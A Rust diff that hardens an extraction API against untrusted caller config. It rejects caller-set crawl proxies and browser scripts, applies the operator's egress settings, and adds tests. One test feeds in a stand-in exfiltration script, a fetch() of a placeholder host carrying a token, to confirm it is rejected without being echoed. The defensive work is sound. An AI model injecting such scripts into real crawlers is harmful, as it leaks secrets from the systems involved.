@@ -83,12 +83,6 @@ impl ApiExtractInput {
             },
         }
     }
-
-    fn config(&self) -> Option<&crate::core::config::FileExtractionConfig> {
-        match self {
-            Self::Bytes { config, .. } | Self::Uri { config, .. } => config.as_ref(),
-        }
-    }
 }
 
 #[derive(Debug)]
@@ -101,27 +95,37 @@ pub(crate) struct UnifiedExtractRequest {
 }
 
 impl UnifiedExtractRequest {
-    fn validate_caller_config(&self) -> Result<(), ApiError> {
-        if let Some(config) = &self.config {
-            validate_serializable_caller_config(config)?;
+    fn adopt_operator_crawl_egress(&mut self, operator: &crate::core::config::ExtractionConfig) {
+        if let Some(config) = self.config.as_mut() {
+            crate::core::config::request_security::adopt_operator_crawl_egress(config, operator);
         }
-        for input in &self.inputs {
-            if let Some(config) = input.config() {
-                validate_serializable_caller_config(config)?;
+        for input in &mut self.inputs {
+            let config = match input {
+                ApiExtractInput::Bytes { config, .. } | ApiExtractInput::Uri { config, .. } => config,
+            };
+            if let Some(config) = config.as_mut() {
+                crate::core::config::request_security::adopt_file_operator_crawl_egress(config, operator);
             }
         }
-        Ok(())
     }
 }
 
-fn validate_serializable_caller_config(config: &impl serde::Serialize) -> Result<(), ApiError> {
-    let value = serde_json::to_value(config).map_err(|_| {
-        ApiError::validation(crate::error::XbergError::validation(
-            "Failed to validate caller extraction configuration",
-        ))
-    })?;
-    crate::core::config::request_security::validate_caller_extraction_config(&value)
+fn validate_caller_config_value(config: &serde_json::Value) -> Result<(), ApiError> {
+    crate::core::config::request_security::validate_caller_extraction_config(config)
         .map_err(|message| ApiError::validation(crate::error::XbergError::validation(message)))
+}
+
+fn validate_input_config_values(inputs: &serde_json::Value) -> Result<(), ApiError> {
+    let values = match inputs {
+        serde_json::Value::Array(values) => values.as_slice(),
+        value => std::slice::from_ref(value),
+    };
+    for input in values {
+        if let Some(config) = input.get("config") {
+            validate_caller_config_value(config)?;
+        }
+    }
+    Ok(())
 }
 
 #[derive(Debug, serde::Deserialize)]
@@ -185,7 +189,7 @@ where
             .and_then(|value| value.to_str().ok())
             .unwrap_or("");
 
-        let request = if content_type.starts_with("multipart/form-data") {
+        if content_type.starts_with("multipart/form-data") {
             parse_multipart_extract_request(req, state).await
         } else if is_json_content_type(content_type) {
             parse_json_extract_request(req).await
@@ -196,9 +200,7 @@ where
                     "Expected Content-Type application/json or multipart/form-data for extraction",
                 ),
             ))
-        }?;
-        request.validate_caller_config()?;
-        Ok(request)
+        }
     }
 }
 
@@ -214,6 +216,18 @@ async fn parse_json_extract_request(req: Request) -> Result<UnifiedExtractReques
             crate::error::XbergError::Other("Failed to read request body".to_string()),
         )
     })?;
+    let raw: serde_json::Value = serde_json::from_slice(&bytes).map_err(|e| {
+        ApiError::new(
+            StatusCode::BAD_REQUEST,
+            crate::error::XbergError::validation(format!("Invalid extraction request JSON: {e}")),
+        )
+    })?;
+    if let Some(config) = raw.get("config") {
+        validate_caller_config_value(config)?;
+    }
+    if let Some(inputs) = raw.get("inputs") {
+        validate_input_config_values(inputs)?;
+    }
     let body: JsonUnifiedExtractRequest = serde_json::from_slice(&bytes).map_err(|e| {
         ApiError::new(
             StatusCode::BAD_REQUEST,
@@ -307,6 +321,13 @@ where
                     .await
                     .map_err(|e| ApiError::validation(crate::error::XbergError::validation(e.to_string())))?;
 
+                let config_value: serde_json::Value = serde_json::from_str(&config_str).map_err(|e| {
+                    ApiError::validation(crate::error::XbergError::validation(format!(
+                        "Invalid extraction configuration: {}",
+                        e
+                    )))
+                })?;
+                validate_caller_config_value(&config_value)?;
                 config = Some(serde_json::from_str(&config_str).map_err(|e| {
                     ApiError::validation(crate::error::XbergError::validation(format!(
                         "Invalid extraction configuration: {}",
@@ -392,6 +413,7 @@ fn parse_inputs_field(raw: &str) -> Result<Vec<ApiExtractInput>, ApiError> {
             "Invalid inputs field JSON: {e}"
         )))
     })?;
+    validate_input_config_values(&value)?;
     let inputs: Vec<JsonExtractInput> = serde_json::from_value(match value {
         serde_json::Value::Array(_) => value,
         other => serde_json::Value::Array(vec![other]),
@@ -662,13 +684,14 @@ fn toon_response(results: &ExtractionResult) -> Result<axum::response::Response<
 pub(crate) async fn extract_handler(
     State(state): State<ApiState>,
     headers: HeaderMap,
-    request: UnifiedExtractRequest,
+    mut request: UnifiedExtractRequest,
 ) -> Result<axum::response::Response<axum::body::Body>, ApiError> {
     let use_toon = wants_toon(&headers) || request.use_toon;
 
     #[cfg(feature = "otel")]
     tracing::Span::current().record("files_count", request.inputs.len());
 
+    request.adopt_operator_crawl_egress(&state.default_config);
     let mut final_config = request.config.unwrap_or_else(|| (*state.default_config).clone());
     apply_multipart_config_fields(&mut final_config, request.output_format, request.pdf_passwords);
     enforce_and_apply_api_uri_policy(&request.inputs, &mut final_config, api_allows_local_uri_inputs())?;
@@ -1206,7 +1229,7 @@ fn resolve_job_timeout_secs(request_timeout_secs: Option<u64>, server_default_se
 )]
 pub(crate) async fn extract_async_handler(
     State(state): State<ApiState>,
-    request: UnifiedExtractRequest,
+    mut request: UnifiedExtractRequest,
 ) -> Result<axum::response::Response, ApiError> {
     if request.inputs.is_empty() {
         return Err(ApiError::validation(crate::error::XbergError::validation(
@@ -1221,6 +1244,7 @@ pub(crate) async fn extract_async_handler(
         ));
     }
 
+    request.adopt_operator_crawl_egress(&state.default_config);
     let job_id = state.job_store.create_job();
     let mut effective_config = request.config.unwrap_or_else(|| (*state.default_config).clone());
     apply_multipart_config_fields(&mut effective_config, request.output_format, request.pdf_passwords);
@@ -1679,6 +1703,189 @@ mod tests {
         );
         assert!(
             !error.body.message.contains(secret_url),
+            "rejection must not include caller-controlled values"
+        );
+    }
+
+    #[tokio::test]
+    #[cfg(feature = "url-config-types")]
+    async fn should_reject_request_level_crawl_egress_config_without_leaking_value() {
+        let secret_proxy = "http://user:secret@proxy.internal:8080";
+        let body = serde_json::json!({
+            "inputs": [{"text": "safe input"}],
+            "config": {"url": {"crawl": {"proxy": {"url": secret_proxy}}}}
+        });
+        let request = Request::builder()
+            .method("POST")
+            .uri("/extract")
+            .header("content-type", "application/json")
+            .body(Body::from(serde_json::to_vec(&body).expect("request body serializes")))
+            .expect("valid request");
+
+        let error = UnifiedExtractRequest::from_request(request, &())
+            .await
+            .expect_err("caller crawl egress config must be rejected");
+
+        assert_eq!(error.status, StatusCode::BAD_REQUEST);
+        assert_eq!(
+            error.body.message,
+            "Validation error: Caller extraction config contains forbidden url.crawl setting: \
+             invalid_config: untrusted caller may not set /proxy"
+        );
+        assert!(
+            !error.body.message.contains(secret_proxy),
+            "rejection must not include caller-controlled values"
+        );
+    }
+
+    #[tokio::test]
+    #[cfg(feature = "url-config-types")]
+    async fn should_accept_safe_request_config_without_rejecting_materialized_crawl_defaults() {
+        let body = serde_json::json!({
+            "inputs": [{"text": "safe input"}],
+            "config": {"url": {"crawl": {"max_depth": 2}}}
+        });
+        let request = Request::builder()
+            .method("POST")
+            .uri("/extract")
+            .header("content-type", "application/json")
+            .body(Body::from(serde_json::to_vec(&body).expect("request body serializes")))
+            .expect("valid request");
+
+        let parsed = UnifiedExtractRequest::from_request(request, &())
+            .await
+            .expect("caller-owned crawl config must remain valid");
+
+        assert_eq!(parsed.config.expect("config is present").url.crawl.max_depth, Some(2));
+    }
+
+    #[tokio::test]
+    #[cfg(feature = "url-config-types")]
+    async fn should_apply_operator_crawl_egress_to_request_and_per_input_configs() {
+        let body = serde_json::json!({
+            "inputs": [{
+                "text": "safe input",
+                "config": {"url": {"crawl": {
+                    "max_depth": 3,
+                    "custom_headers": {"x-caller-input": "input-value"}
+                }}}
+            }],
+            "config": {"url": {"crawl": {
+                "max_depth": 7,
+                "custom_headers": {"x-caller-request": "request-value"}
+            }}}
+        });
+        let request = Request::builder()
+            .method("POST")
+            .uri("/extract")
+            .header("content-type", "application/json")
+            .body(Body::from(serde_json::to_vec(&body).expect("request body serializes")))
+            .expect("valid request");
+        let mut parsed = UnifiedExtractRequest::from_request(request, &())
+            .await
+            .expect("caller-owned crawl config must parse");
+
+        let mut operator = crate::ExtractionConfig::default();
+        operator.url.crawl.ssrf.max_redirects = 1;
+        operator.url.crawl.ssrf.scheme_allowlist = vec!["https".to_string()];
+        operator.url.crawl.max_redirects = 2;
+        operator.url.crawl.proxy = Some(crawlberg::ProxyConfig {
+            url: "http://operator-proxy.internal:8080".to_string(),
+            username: Some("operator".to_string()),
+            password: Some("operator-secret".to_string()),
+        });
+        operator.url.crawl.browser.endpoint = Some("ws://operator-browser.internal/devtools".to_string());
+        operator.url.crawl.browser.session_affinity = false;
+        operator.url.crawl.document_output_dir = Some("/operator/documents".into());
+        operator.url.crawl.warc_output = Some("/operator/archive.warc".into());
+
+        parsed.adopt_operator_crawl_egress(&operator);
+
+        let request_crawl = &parsed.config.as_ref().expect("request config is present").url.crawl;
+        assert_operator_crawl_egress(request_crawl, &operator.url.crawl);
+        assert_eq!(request_crawl.max_depth, Some(7));
+        assert_eq!(
+            request_crawl.custom_headers.get("x-caller-request").map(String::as_str),
+            Some("request-value")
+        );
+
+        let input_crawl = match &parsed.inputs[0] {
+            ApiExtractInput::Bytes { config, .. } | ApiExtractInput::Uri { config, .. } => {
+                &config
+                    .as_ref()
+                    .expect("per-input config is present")
+                    .url
+                    .as_ref()
+                    .expect("URL config is present")
+                    .crawl
+            }
+        };
+        assert_operator_crawl_egress(input_crawl, &operator.url.crawl);
+        assert_eq!(input_crawl.max_depth, Some(3));
+        assert_eq!(
+            input_crawl.custom_headers.get("x-caller-input").map(String::as_str),
+            Some("input-value")
+        );
+
+        let input_config = match &parsed.inputs[0] {
+            ApiExtractInput::Bytes { config, .. } | ApiExtractInput::Uri { config, .. } => {
+                config.as_ref().expect("per-input config is present")
+            }
+        };
+        let resolved = parsed
+            .config
+            .as_ref()
+            .expect("request config is present")
+            .with_file_overrides(input_config);
+        assert_operator_crawl_egress(&resolved.url.crawl, &operator.url.crawl);
+        assert_eq!(resolved.url.crawl.max_depth, Some(3));
+        assert_eq!(
+            resolved
+                .url
+                .crawl
+                .custom_headers
+                .get("x-caller-input")
+                .map(String::as_str),
+            Some("input-value")
+        );
+    }
+
+    #[cfg(feature = "url-config-types")]
+    fn assert_operator_crawl_egress(actual: &crawlberg::CrawlConfig, expected: &crawlberg::CrawlConfig) {
+        assert_eq!(actual.ssrf.max_redirects, expected.ssrf.max_redirects);
+        assert_eq!(actual.ssrf.scheme_allowlist, expected.ssrf.scheme_allowlist);
+        assert_eq!(actual.max_redirects, expected.max_redirects);
+        assert_eq!(
+            actual.proxy.as_ref().map(|proxy| proxy.url.as_str()),
+            expected.proxy.as_ref().map(|proxy| proxy.url.as_str())
+        );
+        assert_eq!(actual.browser.endpoint, expected.browser.endpoint);
+        assert_eq!(actual.browser.session_affinity, expected.browser.session_affinity);
+        assert_eq!(actual.document_output_dir, expected.document_output_dir);
+        assert_eq!(actual.warc_output, expected.warc_output);
+    }
+
+    #[tokio::test]
+    #[cfg(feature = "url-config-types")]
+    async fn should_reject_crawl_egress_config_from_multipart_before_deserializing() {
+        let secret_script = "fetch('https://example.invalid/?token=secret')";
+        let config = serde_json::json!({
+            "url": {"crawl": {"browser": {"eval_script": secret_script}}}
+        });
+        let request = multipart_request_with_field("crawlsecurityboundary", "config", &config.to_string());
+
+        let error = UnifiedExtractRequest::from_request(request, &())
+            .await
+            .expect_err("caller browser script must be rejected");
+
+        assert_eq!(error.status, StatusCode::BAD_REQUEST);
+        assert_eq!(
+            error.body.message,
+            "Validation error: Caller extraction config contains forbidden url.crawl setting: \
+             invalid_config: untrusted caller may not set /browser/eval_script"
+        );
+        assert!(
+            !error.body.message.contains(secret_script),
             "rejection must not include caller-controlled values"
         );
     }
